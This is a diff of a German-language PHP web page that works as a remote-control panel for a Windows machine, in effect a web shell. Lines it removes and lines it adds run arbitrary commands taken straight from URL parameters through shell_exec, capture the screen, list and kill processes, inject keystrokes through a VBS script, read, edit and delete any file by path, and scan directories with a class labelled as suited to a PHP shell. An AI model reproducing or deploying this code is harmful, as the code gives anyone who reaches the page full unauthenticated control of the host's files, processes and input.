@@ -1,633 +1,9 @@
-<style>
-body {
-    background-color: aliceblue;
-}
-</style>
-<?php if (isset($_GET['phpverzeichnisse'])) {?>
 <html>
-    <head></head>
-    <body>
-        
-    </body>
     <style>
-    </style>
-</html>
-<?php } ?>
-<?php if (isset($_GET[ 'nobrain'])) {?>
-<html>
-
-<head></head>
-
-<body>
-    <div id="content">
-        <input id="howmanytimes" onkeyup="add()" type="text" placeholder="Wie offt soll nobrain geöffnet werden?"> <a href="" id="absendena" class="button">Absenden</a> </div>
-</body>
-<script>
-    function add() {
-        var absendena = document.getElementById("absendena");
-        var howmanytimesa = document.getElementById("howmanytimes").value;
-        absendena.href = "?openwebsiteq=nobrain.dk&howmanytimes=" + howmanytimesa;
-    }
-</script>
-<style>
-    #content {
-        width: 100%;
-        height: 100%;
-        top: 0;
-        right: 0;
-        left: 0;
-        buttom: 0;
-        positiom: absolute;
-        text-align: center;
-    }
-    
-    body {
-        background-color: aliceblue;
-    }
-    
-    input[type="text"] {
-        padding: 10px;
-        border: solid 5px #c9c9c9;
-        transition: border 0.3s;
-        width: 24em;
-    }
-    
-    input[type="text"]:focus,
-    input[type="text"].focus {
-        border: solid 5px #969696;
-    }
-    
-    .button {
-        display: inline-block;
-        white-space: nowrap;
-        background-color: #ccc;
-        background-image: linear-gradient(top, #eee, #ccc);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
-        border: 1px solid #777;
-        padding: 0 1.5em;
-        margin: 0.5em;
-        font: bold 1em/2em Arial, Helvetica;
-        text-decoration: none;
-        color: #333;
-        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
-        border-radius: .2em;
-        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
-        z-index: 10;
-    }
-    
-    .button:hover {
-        background-color: #ddd;
-        background-image: linear-gradient(top, #fafafa, #ddd);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
-    }
-    
-    .button:active {
-        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
-        position: relative;
-        top: 1px;
-    }
-    
-    .button:focus {
-        outline: 0;
-        background: #fafafa;
-    }
-    
-    .button:before {
-        background: #ccc;
-        background: rgba(0, 0, 0, .1);
-        float: left;
-        width: 1em;
-        text-align: center;
-        font-size: 1.5em;
-        margin: 0 1em 0 -1em;
-        padding: 0 .2em;
-        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
-        border-radius: .15em 0 0 .15em;
-        pointer-events: none;
-    }
-</style>
-
-</html>
-<?php } ?>
-<?php if (isset($_GET[ 'openwebsite'])) {?>
-<html>
-
-<head></head>
-
-<body>
-    <div id="content">
-        <div id="co">
-            <input onkeyup="javascript:add()" type="text" placeholder="Bsp.: www.google.de" id="websitetext">
-            <input onkeyup="javascript:add()" type="text" placeholder="Bsp.: 4" id="howmanytimes"> <a id="absendena" href="?openwebsiteq=" class="button save">Absenden</a> </div>
-    </div>
-</body>
-<script>
-    function add() {
-        var absendena = document.getElementById("absendena");
-        var websitetexta = document.getElementById("websitetext").value;
-        var howmanytimesa = document.getElementById("howmanytimes").value;
-        absendena.href = "?openwebsiteq=" + websitetexta + "&howmanytimes=" + howmanytimesa;
-    }
-</script>
-<style>
-    input[type="text"] {
-        padding: 10px;
-        border: solid 5px #c9c9c9;
-        transition: border 0.3s;
-    }
-    
-    input[type="text"]:focus,
-    input[type="text"].focus {
-        border: solid 5px #969696;
-    }
-    
-    .button {
-        display: inline-block;
-        white-space: nowrap;
-        background-color: #ccc;
-        background-image: linear-gradient(top, #eee, #ccc);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
-        border: 1px solid #777;
-        padding: 0 1.5em;
-        margin: 0.5em;
-        font: bold 1em/2em Arial, Helvetica;
-        text-decoration: none;
-        color: #333;
-        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
-        border-radius: .2em;
-        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
-        z-index: 10;
-    }
-    
-    .button:hover {
-        background-color: #ddd;
-        background-image: linear-gradient(top, #fafafa, #ddd);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
-    }
-    
-    .button:active {
-        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
-        position: relative;
-        top: 1px;
-    }
-    
-    .button:focus {
-        outline: 0;
-        background: #fafafa;
-    }
-    
-    .button:before {
-        background: #ccc;
-        background: rgba(0, 0, 0, .1);
-        float: left;
-        width: 1em;
-        text-align: center;
-        font-size: 1.5em;
-        margin: 0 1em 0 -1em;
-        padding: 0 .2em;
-        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
-        border-radius: .15em 0 0 .15em;
-        pointer-events: none;
-    }
-    
-    .save:before {
-        content: "\2714";
-    }
-</style>
-
-</html>
-<?php } ?>
-<?php if (isset($_GET[ 'img'])) {?>
-<html>
-<?php function execimg() { $im=imagegrabscreen(); imagepng($im, "sc.png"); imagedestroy($im); } ?>
-
-<head></head>
-
-<body> <a class="button neuladen" href="?img=true">Neues Bild</a> <span id="nimg"> <?php execimg(); ?> <img src="sc.png" alt="screen"></span> </body>
-<style>
-    .button {
-        display: inline-block;
-        white-space: nowrap;
-        background-color: #ccc;
-        background-image: linear-gradient(top, #eee, #ccc);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
-        border: 1px solid #777;
-        padding: 0 1.5em;
-        margin: 0.5em;
-        font: bold 1em/2em Arial, Helvetica;
-        text-decoration: none;
-        color: #333;
-        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
-        border-radius: .2em;
-        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
-        z-index: 10;
-        position: absolute;
-        right: 0;
-        top: 0;
-    }
-    
-    .button:hover {
-        background-color: #ddd;
-        background-image: linear-gradient(top, #fafafa, #ddd);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
-    }
-    
-    .button:active {
-        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
-        position: relative;
-        top: 1px;
-    }
-    
-    .button:focus {
-        outline: 0;
-        background: #fafafa;
-    }
-    
-    .button:before {
-        background: #ccc;
-        background: rgba(0, 0, 0, .1);
-        float: left;
-        width: 1em;
-        text-align: center;
-        font-size: 1.5em;
-        margin: 0 1em 0 -1em;
-        padding: 0 .2em;
-        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
-        border-radius: .15em 0 0 .15em;
-        pointer-events: none;
-    }
-    
-    #nimg {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottum: 0;
-    }
-    
-    #nimg img {
-        width: 100%;
-        height: 100%;
-    }
-    
-    .neuladen:before {
-        content: "&#10226;";
-    }
-</style>
-
-</html>
-<?php } ?>
-<?php if (isset($_GET[ 'INFOS'])) {?>
-<html>
-
-<head> </head>
-
-<body> <span id="zurueck"><a class="button" href="?">Zurück</a></span>
-    <?php echo '<h1>Name des Benutzers: ' . get_current_user(); ?>
-    <?php phpinfo(32); ?> </body>
-<style>
-    #zurueck {
-        position: absolute;
-        right: 0;
-        top: 0;
-    }
-    
-    .button {
-        display: inline-block;
-        white-space: nowrap;
-        background-color: #ccc;
-        background-image: linear-gradient(top, #eee, #ccc);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
-        border: 1px solid #777;
-        padding: 0 1.5em;
-        margin: 0.5em;
-        font: bold 1em/2em Arial, Helvetica;
-        text-decoration: none;
-        color: #333;
-        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
-        border-radius: .2em;
-        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
-    }
-    
-    .button:hover {
-        background-color: #ddd;
-        background-image: linear-gradient(top, #fafafa, #ddd);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
-    }
-    
-    .button:active {
-        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
-        position: relative;
-        top: 1px;
-    }
-    
-    .button:focus {
-        outline: 0;
-        background: #fafafa;
-    }
-    
-    .button:before {
-        background: #ccc;
-        background: rgba(0, 0, 0, .1);
-        float: left;
-        width: 1em;
-        text-align: center;
-        font-size: 1.5em;
-        margin: 0 1em 0 -1em;
-        padding: 0 .2em;
-        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
-        border-radius: .15em 0 0 .15em;
-        pointer-events: none;
-    }
-}
-</style>
-
-</html>
-<?php } ?>
-<?php if (isset($_GET[ 'startprocess'])) {?>
-<html>
-
-<head> </head>
-
-<body>
-    <div id="content">
-        <div id="processlist"> <span id="reloadbu"> <a href="?startprocess&taskrefresh=true" class="button neuladen">Prozesse neu Laden</a> </span>
-            <div id="prog"> <span id="tasklist"> <?php if (isset($_GET['taskrefresh'])) { echo "<script> $(document).ready(function(){ var parent = document.getElementById('tasklist'); var child = document.getElementById('tasklistid'); parent.removeChild(child); }); </script>"; echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; } echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; ?> </span> </div>
-        </div>
-        <div id="go"> <span id="eingbabe"> <input onkeyup="changeuri()" placeholder="Bsp.: tasklist.exe" id="eingabetext" type="text"> </span> <a href="?executecommand" id="execuri" class="button">Befehl Ausführen</a>
-            <div id="result"> <span class="command1"> <?php if (isset($_GET['executecommand'])) { echo "<span style='color:green;'>Dieser Befehl wird ausgeführt: " . $_GET['executecommand'] . "</span><pre id='commands'>" . shell_exec($_GET['executecommand']) . "</pre>"; } ?> </span>
-            </div>
-        </div>
-    </div>
-</body>
-<script>
-    function changeuri() {
-        var text = document.getElementById("eingabetext").value;
-        var execuri = document.getElementById("execuri");
-        execuri.href = "?startprocess&executecommand=" + text;
-    }
-</script>
-<style>
-    #result {
-        background-color: #67dcff;
-        height: 33em;
-        width: 32em;
-    }
-    
-    #go {
-        position: absolute;
-        right: 8em;
-        float: right;
-    }
-    
-    body {
-        background-color: aliceblue;
-    }
-    
-    #processlist {
-        position: absolute;
-        left: 0;
-        top: 0;
-    }
-    
-    #content {
-        text-align: center;
-        position: absolute;
-        width: 100%;
-        height: 100%;
-        top: 0;
-        right: 0;
-        left: 0;
-        background-color: aliceblue;
-    }
-    
-    #buttons a {
-        width: 100%;
-        text-align: center;
-        height: 2em;
-        font-size: 33px;
-        margin: 0;
-        margin-top: 0.8em;
-        margin-bottum: 0.8em;
-        padding: 0;
-    }
-    
-    .button {
-        display: inline-block;
-        white-space: nowrap;
-        background-color: #ccc;
-        background-image: linear-gradient(top, #eee, #ccc);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
-        border: 1px solid #777;
-        padding: 0 1.5em;
-        margin: 0.5em;
-        font: bold 1em/2em Arial, Helvetica;
-        text-decoration: none;
-        color: #333;
-        text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
-        border-radius: .2em;
-        box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
-    }
-    
-    .button:hover {
-        background-color: #ddd;
-        background-image: linear-gradient(top, #fafafa, #ddd);
-        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
-    }
-    
-    .button:active {
-        box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
-        position: relative;
-        top: 1px;
-    }
-    
-    .button:focus {
-        outline: 0;
-        background: #fafafa;
-    }
-    
-    .button:before {
-        background: #ccc;
-        background: rgba(0, 0, 0, .1);
-        float: left;
-        width: 1em;
-        text-align: center;
-        font-size: 1.5em;
-        margin: 0 1em 0 -1em;
-        padding: 0 .2em;
-        box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
-        border-radius: .15em 0 0 .15em;
-        pointer-events: none;
-    }
-    
-    input[type="text"] {
-        padding: 10px;
-        border: solid 5px #c9c9c9;
-        transition: border 0.3s;
-    }
-    
-    input[type="text"]:focus,
-    input[type="text"].focus {
-        border: solid 5px #969696;
-    }
-    
-    .neuladen:before {
-        content: "&#10226;";
-    }
-</style>
-
-</html>
-<?php } ?>
-<?php if (isset($_GET[ 'killprocess'])) {?>
-<html>
-
-<head>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-</head>
-
-<body>
-    <div id="zurueck"> <a class="button" href="?">Zurück</a> </div>
-    <div id="programm">
-        <div id="programms"> <span id="reloadbu"> <a href="?killprocess&taskrefresh=true" class="button neuladen">Prozesse neu Laden</a> </span>
-            <div id="prog"> <span id="tasklist"> <?php if (isset($_GET['taskrefresh'])) { echo "<script> $(document).ready(function(){ var parent = document.getElementById('tasklist'); var child = document.getElementById('tasklistid'); parent.removeChild(child); }); </script>"; echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; } echo "<pre id='tasklistid'>" . shell_exec("tasklist") . "</pre>"; ?> </span> </div>
-        </div>
-        <div id="close">
-            <div id="indexofclose">
-                <input id="pidorpsname" type="text" placeholder="Prozess Name oder PID"> <span onclick="javascript:killprocess(document.getElementById('pidorpsname').value)" class="button">Beenden</span> </div>
-        </div>
-    </div>
-    <style>
-        #prog {
-            position: absolute;
-            top: 0;
-        }
-        
-        #zurueck {
-            top: 0;
-            right: 0;
-            position: absolute;
-            font-size: 20px;
-            text-decoration: none;
-        }
-        
-        #zurueck a {
-            text-decoration: none;
-            color: black;
-        }
-        
-        #programm {
-            height: 100%;
-            width: 100%;
-            position: absolute;
-            left: 0;
-            right: 0;
-            top: 0;
-            bottum: 0;
-            z-index: 10;
-            color: white;
-            text-align: center;
-            position: absolute;
-            z-index: -2;
-        }
-        
-        #prog {
-            overflow: scroll;
-            width: 30em;
-            color: black;
-        }
-        
-        #prog pre {
-            font-size: 10px;
-            margin: 0;
-        }
-        
-        input[type="text"] {
-            padding: 10px;
-            border: solid 5px #c9c9c9;
-            transition: border 0.3s;
-        }
-        
-        input[type="text"]:focus,
-        input[type="text"].focus {
-            border: solid 5px #969696;
-        }
-        
-        #close {
-            position: absolute;
-            top: 20%;
-            right: 20%;
-            width: 25em;
-            height: 5em;
-            text-align: center;
-        }
-        
-        #indexofclose {
-            top: calc(100% + -65px);
-            position: absolute;
-            left: 55px;
-        }
-        
-        .button {
-            display: inline-block;
-            white-space: nowrap;
-            background-color: #ccc;
-            background-image: linear-gradient(top, #eee, #ccc);
-            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
-            border: 1px solid #777;
-            padding: 0 1.5em;
-            margin: 0.5em;
-            font: bold 1em/2em Arial, Helvetica;
-            text-decoration: none;
-            color: #333;
-            text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
-            border-radius: .2em;
-            box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
-        }
-        
-        .button:hover {
-            background-color: #ddd;
-            background-image: linear-gradient(top, #fafafa, #ddd);
-            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
-        }
-        
-        .button:active {
-            box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
-            position: relative;
-            top: 1px;
-        }
-        
-        .button:focus {
-            outline: 0;
-            background: #fafafa;
-        }
-        
-        .button:before {
-            background: #ccc;
-            background: rgba(0, 0, 0, .1);
-            float: left;
-            width: 1em;
-            text-align: center;
-            font-size: 1.5em;
-            margin: 0 1em 0 -1em;
-            padding: 0 .2em;
-            box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
-            border-radius: .15em 0 0 .15em;
-            pointer-events: none;
-        }
-        
-        .neuladen:before {
-            content: "&#10226;";
+        body{
+            background-color:aliceblue;
         }
     </style>
-    <script>
-        function killprocess(a) {
-            if ((a >= 'a' && a <= 'z') || (a >= 'A' && a <= 'Z')) {
-                window.open("?killprocessbyid=" + a + "", "_blank")
-            } else {
-                window.open("?killprocessbypid=" + a + "", "_blank")
-            }
-        };
-    </script>
     <script>
         /*! jQuery v2.1.3 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */ ! function (a, b) {
             "object" == typeof module && "object" == typeof module.exports ? module.exports = a.document ? b(a, !0) : function (a) {
@@ -3717,6 +3093,1100 @@ body {
             }, typeof b === U && (a.jQuery = a.$ = n), n
         });
     </script>
+    </script>
+</html>
+<?php if (isset($_GET['tastaturb'])) {?>
+<html>
+    <html>
+        <head></head>
+        <body>
+           <div id="content">
+            <input type="text" id="buchstaben" onkeyup="javascript:add()" placeholder="z.B.: AAasdasdioupjwqodajis">
+            <a class="button" id="ok" href="" >Drücke die Buchstaben</a>
+            <?php
+                if (isset($_GET['tastatura'])) {
+                $asd = '"' . $_GET['tastatura'] . '"';
+                $command = 'wscript.exe C:\xampp\htdocs\a.vbs ' . $asd ;
+                shell_exec($command);
+                echo "<h1 id='g' style='color:green'>Buchstaben wurden gesendet</h1>";
+                echo "<script>$( document ).ready(function() { $('#g').fadeOut(2000); });</script>";
+                }
+            ?>
+           </div>
+        </body>
+        <script>
+        function add(){
+         var text = document.getElementById("buchstaben").value; 
+         var element = document.getElementById("ok");
+         element.href = "?tastaturb&tastatura=" + text;
+        }
+        </script>
+        <style>
+            #buchstaben,#ok{
+                margin-top:20%;
+            }
+            #content{
+                width:100%;
+                height:100%;
+                background-color: rgba(144, 144, 144, 0.76);
+                position:absolute;
+                top:0;
+                right:0;
+                left:0;
+                bottum:0;
+                text-align:center;
+            }
+        .button {
+            display: inline-block;
+            white-space: nowrap;
+            background-color: #ccc;
+            background-image: linear-gradient(top, #eee, #ccc);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+            border: 1px solid #777;
+            padding: 0 1.5em;
+            margin: 0.5em;
+            font: bold 1em/2em Arial, Helvetica;
+            text-decoration: none;
+            color: #333;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+            border-radius: .2em;
+            box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+        }
+        
+        .button:hover {
+            background-color: #ddd;
+            background-image: linear-gradient(top, #fafafa, #ddd);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+        }
+        
+        .button:active {
+            box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+            position: relative;
+            top: 1px;
+        }
+        
+        .button:focus {
+            outline: 0;
+            background: #fafafa;
+        }
+        
+        .button:before {
+            background: #ccc;
+            background: rgba(0, 0, 0, .1);
+            float: left;
+            width: 1em;
+            text-align: center;
+            font-size: 1.5em;
+            margin: 0 1em 0 -1em;
+            padding: 0 .2em;
+            box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+            border-radius: .15em 0 0 .15em;
+            pointer-events: none;
+        }
+        /* Hexadecimal entities for the icons */
+        
+        .add:before {
+            content: "\271A";
+        }
+        
+        .edit:before {
+            content: "\270E";
+        }
+        
+        .delete:before {
+            content: "\2718";
+        }
+        
+        .save:before {
+            content: "\2714";
+        }
+        
+        .email:before {
+            content: "\2709";
+        }
+        
+        .like:before {
+            content: "\2764";
+        }
+        
+        .next:before {
+            content: "\279C";
+        }
+        
+        .star:before {
+            content: "\2605";
+        }
+        
+        .spark:before {
+            content: "\2737";
+        }
+        
+        .play:before {
+            content: "\25B6";
+        }
+            
+        input[type="text"] {
+        padding: 10px;
+        border: solid 5px #5186CB;
+        transition: border 0.3s;
+        width: 37em;
+        }
+    
+        input[type="text"]:focus,
+        input[type="text"].focus {
+        border: solid 5px rgba(150, 150, 150, 0.59);
+        }
+    
+        </style>
+    </html>
+</html>
+<?php } ?>
+<?php if (isset($_GET['showdateipfadzurdatei'])) {?>
+<html>
+<body>
+    <?php echo "Datei: " . $_GET['showdateipfadzurdatei'];?>
+    <input type="number" id="aender">0</span></br>
+    <?php if (file_exists($_GET['showdateipfadzurdatei'])) {echo "Name: " .basename($_GET['showdateipfadzurdatei']) . "</br>"; echo "Größe: " . filesize($_GET['showdateipfadzurdatei']); }?></br>
+<span id="asd">Text von der Datei: </br>
+    <?php
+       $myfile = fopen($_GET['showdateipfadzurdatei'], "r+") or die("Die Datei konnte nicht gröffnet werden!");
+       echo fread($myfile,filesize($_GET['showdateipfadzurdatei']));
+       fclose($myfile);
+       ?>
+    </span>
+    
+    <textarea   onkeydown="javascript:add()" id="texta" name="text">
+       <?php
+       $myfile = fopen($_GET['showdateipfadzurdatei'], "r+") or die("Die Datei konnte nicht gröffnet werden!");
+       echo fread($myfile,filesize($_GET['showdateipfadzurdatei']));
+       fclose($myfile);
+       ?> 
+    </textarea>
+    <script>
+        function add() {
+            var zahl = document.getElementById("aender");
+            zahl.value++;
+        }
+        window.addEventlistener("load", function(){
+            var zahl = document.getElementById("aender");
+            zahl.value = 0;
+        });
+    </script>
+    <style>
+        #asd{
+            width:10em;
+            height:10em;
+            background-color:black;
+            color:white;
+        }
+        body {
+            background-color: aliceblue;
+        }
+        
+        #texta {
+            width: 40%;
+            height: 100%;
+            position: absolute;
+            right: 0;
+            top: 0;
+            margin: 0;
+            padding: 0;
+            background-color:black;
+            color:white;
+        }
+    </style>
+</body>
+</html>
+<?php } ?>
+<?php if (isset($_GET['phpverzeichnisse'])) {?>
+<html>
+    <head></head>
+    <body>
+    <div id="content">
+    <div id="left"
+<?php
+/*
+    Recursive Directory Scanner Class
+    Eminently Suitable For PHP Shell
+    By B1nary @ Toolbase.me
+*/
+
+class RecursiveProc
+{
+    
+    public
+        $hide = array();
+    
+    private
+        $list = '';
+    
+    /*
+        Surf every directory and display subfolder and files.
+        Recursive handling of subfolders
+    */
+    public function scan_dir($path)
+    {
+        
+        // Open given directory
+        if ($content = @opendir($path)):
+            
+            $this->list .= '<ul>';
+            
+            while (($item = readdir($content)) !== false):
+            
+                // Hide defined directories and files
+                if (!in_array($item, $this->hide)):
+                
+                    // Element is a directory
+                    if (is_dir($path.'/'.$item)):
+                        
+                        /*
+                            Add found directory to the list and check
+                            if this directory itself contains more subfolders
+                            or files
+                        */
+                        $this->list .= '<li><b>'.$item.'</b>';
+                        $this->scan_dir($path.'/'.$item);
+                        $this->list .= '</li>';
+                        
+                    // Element is a file
+                    else:
+                        
+                        // Add found file to the list and make it clickable
+                        $this->list .= '<li><a href="'.$path.'/'.$item.'" target="_blank">'.$item.'</a></li>';
+                        
+                    endif;
+                
+                endif;
+                
+                
+            endwhile;
+            
+            closedir($content);
+            
+            $this->list .= '</ul>';
+        
+        // The given root directory wasn't found. Exiting...
+        else: exit('Directory not found!');
+        endif;
+        
+        return $this->list;
+    
+    }
+
+}
+
+// Initiate class
+$shell = new RecursiveProc;
+
+/*
+    Add any directory or file that should NOT be displayed.
+    Use it for both virtual directories (. and ..) or system
+    files of no interest
+*/
+$shell->hide = array('.', '..', '.DS_Store');
+
+// Start recursive scan
+echo $shell->scan_dir('./');
+?>
+         </div>
+         <div id="right">
+             <div id="bearbeiten">
+                <h2>Datei anzeigen/bearbeiten</h2>
+                 <input type="text" id="dateipf" onkeyup="javascript:add('dateibea','dateipf','?showdateipfadzurdatei=')" palceholder="Beißspiel Pfad: C:\Users\Hans Peter\Desktop\test.vbs"></br>
+                 <a href="" id="dateibea" class="button">Datei Anzeigen/Bearbeiten</a>
+             </div>
+             <div id="loeschen">
+                 <h2>Datei löschen</h2>
+                 <input type="text" id="dateipfrazuloesche" onkeyup="javascript:sonderloeschen()" palceholder="Beißspiel Pfad: C:\Users\Hans Peter\Desktop\test.vbs"></br>
+                 <a href="" id="dateiloeschen" class="button">Datei löschen</a>
+             </div>
+         </div>
+         </div>
+    </body>
+    <script>
+        function add(aba,abc,wo) {
+        var elema = document.getElementById(aba);
+        var ange = document.getElementById(abc).value;
+        var woa = wo;
+        elema.href = woa + ange;
+        }
+        function sonderloeschen(){
+            var elema = document.getElementById("dateiloeschen");
+            var pfad = '"' + document.getElementById("dateipfrazuloesche").value + '"';
+            elema.href = "?startprocess&executecommand=Del " + pfad;
+        }
+    </script>
+    <style>
+        body {
+        background-color: aliceblue;
+        }
+        #bearbeiten{
+            -moz-border-radius: 24px;
+            -webkit-border-radius: 24px;
+            border-radius: 24px;
+            /*IE 7 AND 8 DO NOT SUPPORT BORDER RADIUS*/
+            -moz-box-shadow: 0px 0px 20px #000000;
+            -webkit-box-shadow: 0px 0px 20px #000000;
+            box-shadow: 0px 0px 20px #000000;
+            /*IE 7 AND 8 DO NOT SUPPORT BLUR PROPERTY OF SHADOWS*/
+        }
+        #loeschen{
+            -moz-border-radius: 24px;
+            -webkit-border-radius: 24px;
+            border-radius: 24px;
+            /*IE 7 AND 8 DO NOT SUPPORT BORDER RADIUS*/
+            -moz-box-shadow: 0px 0px 20px #000000;
+            -webkit-box-shadow: 0px 0px 20px #000000;
+            box-shadow: 0px 0px 20px #000000;
+            /*IE 7 AND 8 DO NOT SUPPORT BLUR PROPERTY OF SHADOWS*/
+        }
+        #content{
+            position:absolute;
+            top:0;
+            buttom:0;
+            left:0;
+            right:0;
+            padding:0;
+            margin:0;
+            width:100%;
+            height:100%;
+        }
+        #right{
+            text-align:center;
+            position:absolute;
+            right:0;
+            top:0;
+            width:50%;
+            height:100%;
+        }
+        #left{
+            position:absolute;
+            left:0;
+            top:0;
+            margin:0;
+            padding:0;
+            width:50%;
+            height:100%;
+        }
+        .button {
+            display: inline-block;
+            white-space: nowrap;
+            background-color: #ccc;
+            background-image: linear-gradient(top, #eee, #ccc);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+            border: 1px solid #777;
+            padding: 0 1.5em;
+            margin: 0.5em;
+            font: bold 1em/2em Arial, Helvetica;
+            text-decoration: none;
+            color: #333;
+            text-shadow: 0 1px 0 rgba(255, 255, 255, .8);
+            border-radius: .2em;
+            box-shadow: 0 0 1px 1px rgba(255, 255, 255, .8) inset, 0 1px 0 rgba(0, 0, 0, .3);
+        }
+        
+        .button:hover {
+            background-color: #ddd;
+            background-image: linear-gradient(top, #fafafa, #ddd);
+            filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#fafafa', EndColorStr='#dddddd');
+        }
+        
+        .button:active {
+            box-shadow: 0 0 4px 2px rgba(0, 0, 0, .3) inset;
+            position: relative;
+            top: 1px;
+        }
+        
+        .button:focus {
+            outline: 0;
+            background: #fafafa;
+        }
+        
+        .button:before {
+            background: #ccc;
+            background: rgba(0, 0, 0, .1);
+            float: left;
+            width: 1em;
+            text-align: center;
+            font-size: 1.5em;
+            margin: 0 1em 0 -1em;
+            padding: 0 .2em;
+            box-shadow: 1px 0 0 rgba(0, 0, 0, .5), 2px 0 0 rgba(255, 255, 255, .5);
+            border-radius: .15em 0 0 .15em;
+            pointer-events: none;
+        }
+        /* Hexadecimal entities for the icons */
+        
+        .add:before {
+            content: "\271A";
+        }
+        
+        .edit:before {
+            content: "\270E";
+        }
+        
+        .delete:before {
+            content: "\2718";
+        }
+        
+        .save:before {
+            content: "\2714";
+        }
+        
+        .email:before {
+            content: "\2709";
+        }
+        
+        .like:before {
+            content: "\2764";
+        }
+        
+        .next:before {
+            content: "\279C";
+        }
+        
+        .star:before {
+            content: "\2605";
+        }
+        
+        .spark:before {
+            content: "\2737";
+        }
+        
+        .play:before {
+            content: "\25B6";
+        }
+        input[type="text"] {
+        padding: 10px;
+        border: solid 5px #c9c9c9;
+        transition: border 0.3s;
+        width: 24em;
+        }
+    
+        input[type="text"]:focus,
+        input[type="text"].focus {
+        border: solid 5px #969696;
+        }
+    
+    </style>
+</html>
+<?php } ?>
+<?php if (isset($_GET[ 'nobrain'])) {?>
+<html>
+
+<head></head>
+
+<body>
+    <div id="content">
+        <input id="howmanytimes" onkeyup="add()" type="text" placeholder="Wie offt soll nobrain geöffnet werden?"> <a href="" id="absendena" class="button">Absenden</a> </div>
+</body>
+<script>
+    function add() {
+        var absendena = document.getElementById("absendena");
+        var howmanytimesa = document.getElementById("howmanytimes").value;
+        absendena.href = "?openwebsiteq=nobrain.dk&howmanytimes=" + howmanytimesa;
+    }
+</script>
+<style>
+    #content {
+        width: 100%;
+        height: 100%;
+        top: 0;
+        right: 0;
+        left: 0;
+        buttom: 0;
+        positiom: absolute;
+        text-align: center;
+    }
+    
+    body {
+        background-color: aliceblue;
+    }
+    
+    input[type="text"] {
+        padding: 10px;
+        border: solid 5px #c9c9c9;
+        transition: border 0.3s;
+        width: 24em;
+    }
+    
+    input[type="text"]:focus,
+    input[type="text"].focus {
+        border: solid 5px #969696;
+    }
+    
+    .button {
+        display: inline-block;
+        white-space: nowrap;
+        background-color: #ccc;
+        background-image: linear-gradient(top, #eee, #ccc);
+        filter: progid: DXImageTransform.Microsoft.gradient(startColorStr='#eeeeee', EndColorStr='#cccccc');
+        border: 1px solid #777;
+        padding: 0 1.5em;
+        margin: 0.5em;
+        font: bold 1em/2em Arial, Helvetica;
+        text-decoration: none;
